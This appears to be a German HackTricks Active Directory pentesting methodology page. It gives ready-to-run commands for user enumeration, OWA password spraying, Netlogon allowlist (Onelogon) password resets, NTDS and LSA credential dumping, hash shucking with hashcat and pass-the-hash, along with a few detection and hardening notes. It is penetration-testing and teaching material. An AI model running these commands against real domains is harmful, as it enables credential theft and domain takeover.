# Active Directory-Methodik

{{#include ../../banners/hacktricks-training.md}}

## Grundlegender Überblick

**Active Directory** ist eine grundlegende Technologie, mit der **Netzwerkadministratoren** **Domänen**, **Benutzer** und **Objekte** innerhalb eines Netzwerks effizient erstellen und verwalten können. Die Technologie ist skalierbar und ermöglicht es, eine große Anzahl von Benutzern in überschaubare **Gruppen** und **Untergruppen** zu organisieren und gleichzeitig **Zugriffsrechte** auf verschiedenen Ebenen zu steuern.

Die Struktur von **Active Directory** besteht aus drei Hauptebenen: **Domänen**, **Bäumen** und **Gesamtstrukturen**. Eine **Domäne** umfasst eine Gruppe von Objekten, etwa **Benutzer** oder **Geräte**, die eine gemeinsame Datenbank nutzen. **Bäume** sind Gruppen solcher Domänen, die durch eine gemeinsame Struktur miteinander verbunden sind. Eine **Gesamtstruktur** umfasst mehrere Bäume, die durch **Vertrauensbeziehungen** miteinander verbunden sind, und bildet die oberste Ebene der Organisationsstruktur. Auf jeder dieser Ebenen können bestimmte **Zugriffs-** und **Kommunikationsrechte** festgelegt werden.

Zu den wichtigen Konzepten in **Active Directory** gehören:

1. **Verzeichnis** – Enthält alle Informationen zu Active Directory-Objekten.
2. **Objekt** – Bezeichnet Entitäten im Verzeichnis, darunter **Benutzer**, **Gruppen** oder **freigegebene Ordner**.
3. **Domäne** – Dient als Container für Verzeichnisobjekte. Innerhalb einer **Gesamtstruktur** können mehrere Domänen existieren, von denen jede ihre eigene Objektsammlung verwaltet.
4. **Baum** – Eine Gruppe von Domänen mit einer gemeinsamen Stammdomäne.
5. **Gesamtstruktur** – Die oberste Ebene der Organisationsstruktur in Active Directory. Sie besteht aus mehreren Bäumen, zwischen denen **Vertrauensbeziehungen** bestehen.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks wichtig sind. Dazu gehören:

1. **Domänendienste** – Zentralisieren die Datenspeicherung und verwalten die Interaktionen zwischen **Benutzern** und **Domänen**, einschließlich **Authentifizierungs-** und **Suchfunktionen**.
2. **Zertifikatdienste** – Verwalten die Erstellung, Verteilung und Verwaltung sicherer **digitaler Zertifikate**.
3. **Lightweight Directory Services** – Unterstützen verzeichnisfähige Anwendungen über das **LDAP-Protokoll**.
4. **Directory Federation Services** – Bieten **Single Sign-on**, damit Benutzer in einer Sitzung über mehrere Webanwendungen hinweg authentifiziert werden können.
5. **Rights Management** – Schützen urheberrechtlich geschütztes Material, indem dessen unerlaubte Verbreitung und Nutzung eingeschränkt wird.
6. **DNS-Dienst** – Ist entscheidend für die Auflösung von **Domänennamen**.

Eine ausführlichere Erklärung findest du unter: [**TechTerms – Definition von Active Directory**](https://techterms.com/definition/active_directory)

### **Kerberos-Authentifizierung**

Um zu lernen, wie man **ein AD angreift**, musst du den **Kerberos-Authentifizierungsprozess** wirklich gut **verstehen**.\
[**Lies diese Seite, wenn du noch nicht weißt, wie er funktioniert.**](kerberos-authentication.md)

## Spickzettel

Auf [https://wadcoms.github.io/](https://wadcoms.github.io) findest du eine schnelle Übersicht über Befehle, mit denen du ein AD enumerieren/ausnutzen kannst.

> [!WARNING]
> Die Kerberos-Kommunikation **erfordert normalerweise einen vollqualifizierten Domänennamen (FQDN)**, damit der Client ein Ticket für den richtigen SPN abrufen kann. Beim Zugriff auf einen Computer über eine IP-Adresse wird üblicherweise auf NTLM statt Kerberos zurückgegriffen.

## Active Directory-Recon (ohne Zugangsdaten/Sitzungen)

Wenn du Zugriff auf eine AD-Umgebung hast, aber keine Zugangsdaten/Sitzungen besitzt, kannst du Folgendes tun:

- **Das Netzwerk pentesten:**
  - Scanne das Netzwerk, finde Computer und offene Ports und versuche, **Schwachstellen auszunutzen** oder **Zugangsdaten zu extrahieren** (zum Beispiel können [Drucker interessante Ziele sein](ad-information-in-printers.md)).
  - Eine DNS-Enumeration kann Informationen über wichtige Server in der Domäne liefern, etwa Webserver, Drucker, Freigaben, VPN, Medienserver usw.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Wirf einen Blick auf die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), um weitere Informationen dazu zu erhalten.
- **Prüfe SMB-Dienste auf Null- und Guest-Zugriff** (funktioniert nicht mit modernen Windows-Versionen):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Eine ausführlichere Anleitung zur Enumeration eines SMB-Servers findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP enumerieren**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Eine ausführlichere Anleitung zur LDAP-Enumeration findest du hier (achte besonders auf den **anonymen Zugriff**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Das Netzwerk vergiften**
  - Sammle Zugangsdaten, indem du [**mit Responder Dienste imitierst**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Greife auf einen Host zu, indem du [**den Relay-Angriff missbrauchst**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Sammle Zugangsdaten, indem du [**gefälschte UPnP-Dienste mit evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) **bereitstellst**
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Extrahiere Benutzernamen und Namen aus internen Dokumenten, sozialen Medien und Diensten (vor allem Webdiensten) innerhalb der Domänenumgebungen sowie aus öffentlich verfügbaren Quellen.
  - Wenn du die vollständigen Namen von Mitarbeitern eines Unternehmens findest, kannst du verschiedene AD-**Benutzernamenkonventionen** ausprobieren ([**lies dies**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die häufigsten Konventionen sind: _NameNachname_, _Name.Nachname_, _NamNach_ (jeweils 3 Buchstaben), _Nam.Nach_, _NNachname_, _N.Nachname_, _NachnameName_, _Nachname.Name_, _NachnameN_, _Nachname.N_, 3 _zufällige Buchstaben und 3 zufällige Ziffern_ (abc123).
  - Tools:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Benutzer-Enumeration

- **Anonyme SMB/LDAP-Enumeration:** Sieh dir die Seiten zu [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) an.
- **Kerbrute-Enumeration**: Wenn ein **ungültiger Benutzername angefordert wird**, antwortet der Server mit dem **Kerberos-Fehlercode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_. So lässt sich feststellen, dass der Benutzername ungültig ist. Bei **gültigen Benutzernamen** wird entweder das **TGT in einer AS-REP**-Antwort zurückgegeben oder der Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_ ausgegeben, der anzeigt, dass der Benutzer eine Präauthentifizierung durchführen muss.
- **Keine Authentifizierung über MS-NRPC**: Dabei wird auth-level = 1 (keine Authentifizierung) gegen die MS-NRPC-Schnittstelle (Netlogon) auf Domänencontrollern verwendet. Nach dem Binden an die MS-NRPC-Schnittstelle ruft die Methode die Funktion `DsrGetDcNameEx2` auf, um ohne Zugangsdaten zu prüfen, ob der Benutzer oder Computer existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Recherche findest du [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Wenn Sie einen dieser Server im Netzwerk gefunden haben, können Sie auch **user enumeration gegen ihn durchführen**. Dazu könnten Sie beispielsweise das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Listen mit Benutzernamen findest du in [**diesem github-Repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) und in diesem ([**statistisch wahrscheinliche Benutzernamen**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Allerdings solltest du die **Namen der Personen kennen, die im Unternehmen arbeiten**. Diese solltest du beim zuvor durchgeführten Recon-Schritt ermittelt haben. Mit Vor- und Nachnamen könntest du das Skript [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um potenziell gültige Benutzernamen zu generieren.

### Missbrauch der Allowlist für verwundbare Netlogon-Kanäle (Onelogon)

Auch wenn **Zerologon** auf dem DC gepatcht ist, können explizit auf die Allowlist gesetzte Konten weiterhin durch **veraltetes/verwundbares Netlogon-Secure-Channel-Verhalten** gefährdet sein. Die riskante Konfiguration ist die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** oder der entsprechende Registry-Wert **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Dieser Wert ist ein **SDDL-Sicherheitsdeskriptor** (siehe [Security Descriptors](security-descriptors.md)). Jedes Konto oder jede Gruppe, dem bzw. der die entsprechende ACE in der DACL gewährt wird, kann angegriffen werden. Beispielsweise setzt `O:BAG:BAD:(A;;RC;;;WD)` effektiv **Everyone** auf die Allowlist.

Praktischer Ablauf für Operatoren:

1. **Ermittle die Principals auf der Allowlist**, indem du sowohl **SYSVOL/GPO** als auch die **aktive DC-Registry** überprüfst.
2. **Löse die SIDs** im SDDL zu tatsächlichen AD-Benutzern/Computern auf und priorisiere **DC-Computerkonten**, **Trust-Konten** und andere privilegierte Computer.
3. Versuche wiederholt eine **MS-NRPC-/Netlogon-Authentifizierung** als das auf der Allowlist stehende Konto.
4. Missbrauche nach einem erfolgreichen Guess das **Setzen von Netlogon-Passwörtern**, um das Passwort des Zielkontos zurückzusetzen (der öffentliche PoC setzt es auf eine leere Zeichenfolge).<sup>[[9]](#references)[[10]](#references)</sup>

Schnelle Triage-/Lab-Beispiele aus dem öffentlichen Artefakt:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Hinweise:

- Der **scanner** ist nützlich, weil die effektive Allow-List in **SYSVOL**, der **registry** oder an beiden Orten vorhanden sein kann.
- Der Exploit-Pfad selbst ist wichtig, weil er **keine Domain-Admin-Rechte erfordert**, sobald ein verwundbares Konto identifiziert wurde.
- Die Kompromittierung eines **Domain-Controller-Machine-Accounts** wie `DC$` ist besonders gefährlich, da das Zurücksetzen dieses Passworts direkt weiterreichende **AD-Takeover**-Pfade ermöglichen kann.
- Ob **Brute Force** praktikabel ist, hängt vom Modus ab: Das öffentliche Artefakt beschreibt einen Meet-in-the-Middle-Ansatz, **24-Bit-Brute-Force**, wenn ein weiteres Computerkonto verfügbar ist, sowie langsamere **32-Bit**-Varianten.

Hinweise zu Erkennung und Härtung:

- Prüfe die Allow-List-Richtlinie und entferne alle Einträge außer temporären, ausdrücklich erforderlichen Kompatibilitätsausnahmen.
- Überwache die DC-**System**-Ereignisse **5827/5828/5829/5830/5831**, um zu erkennen, wenn verwundbare Netlogon-Verbindungen durchgesetzt, entdeckt oder aufgrund einer Richtlinie ausdrücklich zugelassen werden.
- Behandle Konten in `VulnerableChannelAllowList` als **Hochrisikokonten**, bis die Legacy-Abhängigkeit beseitigt ist.

### Einen oder mehrere Benutzernamen kennen

Okay, du weißt also, dass du bereits einen gültigen Benutzernamen hast, aber keine Passwörter ... Dann versuche Folgendes:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer das Attribut _DONT_REQ_PREAUTH_ **nicht hat**, kannst du für diesen Benutzer eine **AS_REP-Nachricht anfordern**, die Daten enthält, die mit einer Ableitung des Passworts des Benutzers verschlüsselt sind.
- [**Password Spraying**](password-spraying.md): Versuche die **gängigsten Passwörter** mit jedem der entdeckten Benutzer. Vielleicht verwendet ein Benutzer ein schwaches Passwort (beachte die Passwortrichtlinie!).
  - Beachte, dass du auch **OWA-Server sprayen** kannst, um Zugriff auf die Mailserver der Benutzer zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Möglicherweise kannst du **Challenge-Hashes erhalten**, indem du einige **Netzwerkprotokolle** durch **Poisoning** manipulierst:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Die Enumeration von Active Directory liefert Benutzernamen, E-Mail-Kennungen und Namensmuster, mögliche Hosts sowie Dienste, zu denen eine Authentifizierung erzwungen werden kann. Nutze diesen Kontext, um geeignete NTLM-[**Relay-Angriffe**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) und potenzielle Zugriffswege in die AD-Umgebung zu identifizieren.

### NetExec: Workspace-gestützte Aufklärung und Prüfungen der Relay-Sicherheitslage

- Verwende **`nxcdb`-Workspaces**, um den Status der AD-Aufklärung je Engagement getrennt zu speichern: `workspace create <name>` erstellt protokollspezifische SQLite-Datenbanken unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap usw.). Wechsle mit `proto smb|mssql|winrm` zwischen den Ansichten und liste mit `creds` gesammelte Secrets auf. Lösche sensible Daten anschließend manuell: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Eine schnelle Subnetzerkennung mit **`netexec smb <cidr>`** zeigt **Domain**, **OS-Build**, **SMB-Signing-Anforderungen** und **Null Auth** an. Hosts mit `(signing:False)` sind **anfällig für Relay-Angriffe**, während DCs häufig Signing verlangen.
- Erzeuge direkt aus der NetExec-Ausgabe Hostnamen in **/etc/hosts**, um das Targeting zu erleichtern:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Wenn **SMB relay zum DC durch Signing blockiert wird**, prüfe trotzdem die **LDAP**-Konfiguration: `netexec ldap <dc>` weist auf `(signing:None)` / schwaches Channel Binding hin. Ein DC, bei dem SMB Signing erforderlich, LDAP Signing aber deaktiviert ist, bleibt ein geeignetes Ziel für **relay-to-LDAP**-Angriffe wie **SPN-less RBCD**.

### Client-side-Drucker-Credential-Leaks → domainweite Credential-Validierung in großem Umfang

- Drucker-/Web-UIs **betten manchmal maskierte Admin-Passwörter in HTML ein**. Das Anzeigen des Quelltexts oder der DevTools kann Klartext offenlegen (z. B. `<input value="<password>">`) und so Basic-Auth-Zugriff auf Scan-/Druck-Repositories ermöglichen.
- Abgerufene Druckaufträge können **Onboarding-Dokumente im Klartext** mit Passwörtern einzelner Benutzer enthalten. Die Zuordnungen beim Testen beibehalten:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM-Creds stehlen

Wenn du mit dem **null- oder guest-Benutzer auf andere PCs oder Freigaben zugreifen** kannst, könntest du **Dateien ablegen** (z. B. eine SCF-Datei), die bei einem Zugriff irgendwie eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge stehlen** und knacken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate-Angriffe

Beim **Hash Shucking** wird jeder NT-Hash, über den du bereits verfügst, als Kandidatenpasswort für andere, langsamere Formate verwendet, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos-RC4-Tickets, NetNTLM-Challenges oder zwischengespeicherten Anmeldedaten per Brute Force zu knacken, gibst du die NT-Hashes in Hashcats NT-Candidate-Modi ein und lässt sie Passwortwiederverwendung überprüfen, ohne jemals den Klartext zu ermitteln. Besonders wirkungsvoll ist das nach einer Kompromittierung der Domäne, wenn du Tausende aktuelle und historische NT-Hashes sammeln kannst.<sup>[[5]](#references)</sup>

Nutze Shucking, wenn:

- Du über einen NT-Hashbestand aus DCSync, SAM/SECURITY-Dumps oder Credential Vaults verfügst und auf Wiederverwendung in anderen Domänen/Forests prüfen musst.
- Du Kerberos-Material auf RC4-Basis (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-Antworten oder DCC/DCC2-Blobs abfängst.
- Du die Wiederverwendung langer, nicht knackbarer Passphrasen schnell nachweisen und sofort per Pass-the-Hash weiter pivotieren möchtest.

Die Technik **funktioniert nicht** bei Verschlüsselungstypen, deren Schlüssel nicht der NT-Hash ist (z. B. Kerberos etype 17/18 AES). Wenn eine Domäne ausschließlich AES erzwingt, musst du auf die regulären Passwortmodi zurückgreifen.

#### Einen NT-Hashbestand erstellen

- **DCSync/NTDS** – Verwende `secretsdump.py` mit dem Verlauf, um die größtmögliche Anzahl an NT-Hashes (einschließlich ihrer vorherigen Werte) abzurufen:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Verlaufseinträge erweitern den Kandidatenpool erheblich, da Microsoft bis zu 24 vorherige Hashes pro Konto speichern kann. Weitere Möglichkeiten zum Sammeln von NTDS-Secrets findest du hier:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint-Cache-Dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM-/SECURITY-Daten und zwischengespeicherte Domain-Logons (DCC/DCC2). Entferne Duplikate und füge diese Hashes derselben `nt_candidates.txt`-Liste hinzu.
- **Metadaten nachverfolgen** – Speichere den Benutzernamen/die Domain, von denen jeder Hash stammt (auch wenn die Wordlist nur Hex-Werte enthält). Anhand übereinstimmender Hashes erkennst du sofort, welcher Principal ein Passwort wiederverwendet, sobald Hashcat den passenden Kandidaten ausgibt.
- Bevorzuge Kandidaten aus derselben Forest oder einer vertrauenswürdigen Forest; das maximiert die Wahrscheinlichkeit von Überschneidungen beim Shucking.

#### Hashcat-Modi für NT-Kandidaten

| Hash-Typ                                | Passwortmodus | NT-Kandidatenmodus |
| ---------------------------------------- | ------------- | ------------------ |
| Domain Cached Credentials (DCC)          | 1100          | 31500              |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600              |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000              |
| NetNTLMv2                                | 5600          | 27100              |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_              |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300              |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400              |

Hinweise:

- NT-Kandidaten-Eingaben **müssen rohe NT-Hashes mit 32 Hex-Zeichen bleiben**. Deaktiviere Rule Engines (kein `-r`, keine Hybrid-Modi), da Mangling das Schlüsselmaterial der Kandidaten beschädigt.
- Diese Modi sind nicht grundsätzlich schneller, aber der NTLM-Keyspace (~30.000 MH/s auf einem M3 Max) ist etwa 100-mal schneller als Kerberos RC4 (~300 MH/s). Eine kuratierte NT-Liste zu testen ist deutlich günstiger, als den gesamten Passwort-Raum im langsameren Format zu durchsuchen.
- Verwende immer den **neuesten Hashcat-Build** (`git clone https://github.com/hashcat/hashcat && make install`), da die Modi 31500/31600/35300/35400 erst kürzlich hinzugefügt wurden.<sup>[[7]](#references)</sup>
- Derzeit gibt es keinen NT-Modus für AS-REQ Pre-Auth, und AES-Etypes (19600/19700) erfordern das Klartextpasswort, da ihre Schlüssel per PBKDF2 aus UTF-16LE-Passwörtern abgeleitet werden, nicht aus rohen NT-Hashes.

#### Beispiel – Kerberoast RC4 (Modus 35300)

1. Erfasse mit einem Benutzer mit geringen Berechtigungen ein RC4-TGS für einen Ziel-SPN (Details findest du auf der Kerberoast-Seite):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Extrahiere das Ticket mit deiner NT-Liste:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat leitet den RC4-Schlüssel aus jedem NT-Kandidaten ab und validiert den `$krb5tgs$23$...`-Blob. Ein Treffer bestätigt, dass das Dienstkonto einen deiner vorhandenen NT-Hashes verwendet.

3. Wechsle sofort zu PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Du kannst den Klartext später bei Bedarf mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen.

#### Beispiel – Zwischengespeicherte Anmeldedaten (Modus 31600)

1. Dump zwischengespeicherter Logons von einer kompromittierten Workstation:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Kopiere die DCC2-Zeile des interessanten Domänenbenutzers in `dcc2_highpriv.txt` und shucke sie:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Ein erfolgreicher Treffer liefert den NT-Hash, der bereits in deiner Liste steht, und beweist damit, dass der gecachte Benutzer ein Passwort wiederverwendet. Verwende ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder führe einen Brute-Force-Angriff im schnellen NTLM-Modus aus, um den Klartext wiederherzustellen.

Derselbe Workflow gilt für NetNTLM-Challenge-Responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald ein Treffer identifiziert wurde, kannst du Relay, SMB/WMI/WinRM-PtH starten oder den NT-Hash offline erneut mit Masken/Regeln cracken.



## Active Directory MIT Zugangsdaten/Sitzung enumerieren

Für diese Phase musst du **die Zugangsdaten oder eine Sitzung eines gültigen Domänenkontos kompromittiert haben.** Wenn du über gültige Zugangsdaten oder eine Shell als Domänenbenutzer verfügst, **solltest du bedenken, dass die zuvor genannten Möglichkeiten weiterhin dazu dienen können, andere Benutzer zu kompromittieren**.

Bevor du mit der authentifizierten Enumeration beginnst, solltest du das **Kerberos-Double-Hop-Problem** verstehen.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Ein Konto zu kompromittieren ist ein **wichtiger Schritt bei der Bewertung der Domäne**, da es eine authentifizierte **Active Directory-Enumeration** ermöglicht:

Im Hinblick auf [**ASREPRoast**](asreproast.md) kannst du nun alle potenziell verwundbaren Benutzer finden. Mit [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Benutzernamen** erstellen und das Passwort des kompromittierten Kontos, leere Passwörter und neue vielversprechende Passwörter ausprobieren.

- Du kannst die [**CMD für eine grundlegende Recon**](../basic-cmd-for-pentesters.md#domain-info) verwenden
- Du kannst auch [**PowerShell für Recon**](../basic-powershell-for-pentesters/index.html) verwenden, was unauffälliger ist
- Du kannst auch [**PowerView verwenden**](../basic-powershell-for-pentesters/powerview.md), um detailliertere Informationen zu sammeln
- Ein weiteres großartiges Tool für Recon in einem Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht besonders unauffällig** (abhängig von den verwendeten Erfassungsmethoden), aber **wenn dir das egal ist**, solltest du es unbedingt ausprobieren. Finde heraus, wo Benutzer RDP verwenden können, und ermittle Pfade zu anderen Gruppen usw.
  - **Weitere automatisierte AD-Enumerationstools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS-Einträge des AD**](ad-dns-records.md), da sie interessante Informationen enthalten können.
- Ein **Tool mit GUI**, mit dem du das Verzeichnis enumerieren kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst auch mit **ldapsearch** die LDAP-Datenbank nach Zugangsdaten in den Feldern _userPassword_ und _unixUserPassword_ sowie in den Notizen _description_ und _info_ von Benutzern durchsuchen. Ein nicht gekennzeichneter, passwortähnlicher Wert in _info_ ist lediglich ein Kandidat: Bestätige Zweck und Gültigkeit separat und gib Notizinhalte bei routinemäßigen Enumeration-Ausgaben nicht aus. Weitere Methoden findest du unter [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Prüfe **zugängliche** Domänen-Anmelde- und Laufwerkszuordnungsskripte in `\\<dc>\NETLOGON` oder `\\<dc>\SYSVOL\<domain>\scripts`, sofern du dazu berechtigt bist. [Microsoft dokumentiert](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) die Funktion der NETLOGON-Freigabe als Skriptverzeichnis. Liste zuerst die Namen auf und prüfe anschließend nur relevante, lesbare Skripte innerhalb eines Größenlimits. Gib nicht die gesamte Freigabe aus und zeige bei routinemäßiger Enumeration keine Zugangsdaten an. Ein PowerShell-Aufruf von [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **schützt** ein im Skript gespeichertes Klartextpasswort **nicht**. Der Aufruf allein beweist nicht, dass ein Geheimnis fest codiert ist: Verfolge die tatsächliche Eingabe und überprüfe anschließend separat das Konto, die Gültigkeit der Zugangsdaten und die Berechtigungen. Die Prüfung eines Domänenskripts auf einer Remote-Freigabe ist von der Enumeration eines lokalen Hosts getrennt.
- Wenn du **Linux** verwendest, kannst du die Domäne auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du kannst außerdem automatisierte Tools wie die folgenden ausprobieren:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domänenbenutzer extrahieren**

  Es ist sehr einfach, alle Domänenbenutzernamen unter Windows abzurufen (`net user /domain` ,`Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux kannst du Folgendes verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Enumeration-Abschnitt kurz wirkt, ist er der wichtigste Teil überhaupt. Rufe die Links auf (vor allem zu CMD, PowerShell, PowerView und BloodHound), lerne, wie man eine Domäne enumeriert, und übe, bis du dich sicher fühlst. Bei einem Assessment ist dies der entscheidende Moment, um den Weg zu DA zu finden oder festzustellen, dass nichts unternommen werden kann.

### Vorhersehbare, vorab erstellte Computerkonten -> Zugriff auf gMSA-Passwörter

Computerkonten, die für ältere Domänenbeitritte vorbereitet wurden, können ein vorhersagbares initiales Passwort behalten. Das `pre2k`-Modul von NetExec identifiziert den charakteristischen `userAccountControl`-Wert `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) und versucht, mit den ersten 14 Zeichen des kleingeschriebenen Computernamens, ohne das abschließende `$`, ein Kerberos-TGT abzurufen. Betrachte diesen UAC-Wert als Auswahlkriterium für mögliche Kandidaten. Gehe nicht davon aus, dass die Mitgliedschaft in **Pre-Windows 2000 Compatible Access** allein ein schwaches Passwort beweist.<sup>[[18]](#references)[[20]](#references)</sup>

Verwende die authentifizierte LDAP-Enumeration, um die Kandidaten zu testen und erfolgreiche TGTs zu speichern. `ALL=True` erweitert die Tests über Objekte hinaus, die dem Standardfilter `4128` entsprechen.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

